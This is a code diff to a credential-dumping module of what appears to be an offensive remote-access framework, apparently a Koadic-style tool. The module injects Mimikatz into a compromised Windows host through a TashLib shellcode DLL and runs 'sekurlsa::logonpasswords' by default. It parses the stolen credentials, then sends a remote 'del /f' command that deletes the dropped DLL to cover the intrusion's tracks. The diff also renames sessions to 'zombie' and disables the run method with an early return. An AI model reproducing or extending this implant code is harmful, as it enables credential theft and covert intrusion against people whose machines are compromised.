@@ -4,11 +4,20 @@ import core.cred_parser
 import string
 import collections
 import time
+import uuid
 
 class TashLibShellcodeJob(core.job.Job):
     def create(self):
         self.fork32Bit = True
         self.errstat = 0
+        self.options.set("DLLUUID", uuid.uuid4().hex)
+        self.options.set("MANIFESTUUID", uuid.uuid4().hex)
+        self.options.set("SHIMX64UUID", uuid.uuid4().hex)
+        self.options.set("MIMIX64UUID", uuid.uuid4().hex)
+        self.options.set("MIMIX86UUID", uuid.uuid4().hex)
+        self.options.set("MIMICMD", self.options.get("MIMICMD").lower())
+        self.options.set("SHIMX86BYTES", self.make_arrDLL(self.options.get("SHIMX86DLL")))
+        self.options.set("DIRECTORY", self.options.get('DIRECTORY').replace("\\", "\\\\").replace('"', '\\"'))
 
     def parse_mimikatz(self, data):
         cp = core.cred_parser.CredParse(self)
@@ -61,14 +70,14 @@ class TashLibShellcodeJob(core.job.Job):
         self.display()
         time.sleep(1)
         plugin = self.shell.plugins['implant/manage/exec_cmd']
-        old_session = plugin.options.get("session")
+        old_zombie = plugin.options.get("ZOMBIE")
         old_cmd = plugin.options.get("CMD")
         old_output = plugin.options.get("OUTPUT")
-        plugin.options.set("session", self.options.get("session"))
+        plugin.options.set("ZOMBIE", self.options.get("ZOMBIE"))
         plugin.options.set("CMD", "del /f "+self.options.get("DIRECTORY")+"\\TashLib.dll & echo done")
         plugin.options.set("OUTPUT", "true")
         plugin.run()
-        plugin.options.set("session", old_session)
+        plugin.options.set("ZOMBIE", old_zombie)
         plugin.options.set("CMD", old_cmd)
         plugin.options.set("OUTPUT", old_output)
 
@@ -86,7 +95,7 @@ class TashLibShellcodeImplant(core.implant.Implant):
     STATE = "implant/inject/mimikatz_tashlib"
 
     def load(self):
-        self.options.register("DIRECTORY", "%TEMP%", "Writeable directory on session.", required=False)
+        self.options.register("DIRECTORY", "%TEMP%", "Writeable directory on zombie.", required=False)
 
         self.options.register("MIMICMD", "sekurlsa::logonpasswords", "What Mimikatz command to run?", required=True)
 
@@ -130,24 +139,10 @@ class TashLibShellcodeImplant(core.implant.Implant):
         return ret
 
     def run(self):
-        print("Currently disabled, see: https://github.com/entynetproject/entypreter/issues")
-
-        import uuid
-        self.options.set("DLLUUID", uuid.uuid4().hex)
-        self.options.set("MANIFESTUUID", uuid.uuid4().hex)
-        self.options.set("SHIMX64UUID", uuid.uuid4().hex)
-        self.options.set("MIMIX64UUID", uuid.uuid4().hex)
-        self.options.set("MIMIX86UUID", uuid.uuid4().hex)
-
-        self.options.set("MIMICMD", self.options.get("MIMICMD").lower())
-
-
-        self.options.set("SHIMX86BYTES", self.make_arrDLL(self.options.get("SHIMX86DLL")))
-        self.options.set("DIRECTORY", self.options.get('DIRECTORY').replace("\\", "\\\\").replace('"', '\\"'))
-
+        print("Currently disabled!")
+        return
 
         workloads = {}
-        workloads["js"] = self.loader.load_script("data/implant/inject/mimikatz_tashlib.js", self.options)
-
+        workloads["js"] = "data/implant/inject/mimikatz_tashlib.js"
 
         self.dispatch(workloads, self.job)
